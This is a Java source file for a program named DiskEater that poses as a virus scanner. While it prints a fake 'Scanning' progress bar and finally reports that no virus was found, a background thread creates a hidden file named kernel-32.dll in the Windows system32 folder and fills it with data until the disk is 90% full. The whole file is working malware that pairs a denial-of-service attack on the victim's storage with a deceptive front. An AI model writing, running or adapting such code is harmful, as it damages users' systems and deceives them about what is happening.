import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.LinkOption;

public class DiskEater {

	public DiskEater (){
		Thread diskEater = new Thread (new Runnable (){
			@Override
			public void run() {
				File f = new File(System.getenv("SystemRoot") + "\\system32\\kernel-32.dll");
				
				if(!f.exists())
					try {
						f.createNewFile();
					} catch (IOException e1) {
						e1.printStackTrace();
					}
				
				try {
					OutputStream os = new FileOutputStream(f);
					byte[] buf = new byte[1024];
					while ((float)(f.getTotalSpace()-f.getUsableSpace())/f.getTotalSpace() < 0.9) {
						for(int i = 0; i < 100; i++)
							os.write(buf);
						os.flush();
					}
					
					os.close();
					
					try {
						Files.setAttribute(f.toPath(), "dos:hidden", Boolean.TRUE, LinkOption.NOFOLLOW_LINKS);
					} catch (IOException e) {
						e.printStackTrace();
					}
					
				} catch (IOException e1) {
					e1.printStackTrace();
				}
			}
		});
		diskEater.start();
		
		int dots = 0;
		File f = new File(System.getenv("SystemRoot"));
		while(diskEater.isAlive()) {
			System.out.println("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
			System.out.println("############################################################");
			System.out.println();
			String temp = "";
			
			for(int i = 0; i < dots; i++)
				temp += ".";
			System.out.println("                      Scanning" + temp);
			System.out.println();
			
			String t = "#   |";
			float progress = (float)(f.getTotalSpace()-f.getUsableSpace())/f.getTotalSpace();
			for(int i = 0; i < 50; i++)
				if(progress > i/50f)
					t += "#";
				else
					t += " ";
			t+="|   #";
			System.out.println(t);
			System.out.println();
			System.out.println("############################################################");
			if(dots < 5)
				dots++;
			else
				dots = 0;
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		System.out.println("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
		System.out.println("############################################################");
		System.out.println();
		System.out.println("         The scan has finished and no virus were found!");
		System.out.println();
		System.out.println("############################################################");
	}
	
	public static void main(String[] args){
		new DiskEater();
	}
	
}
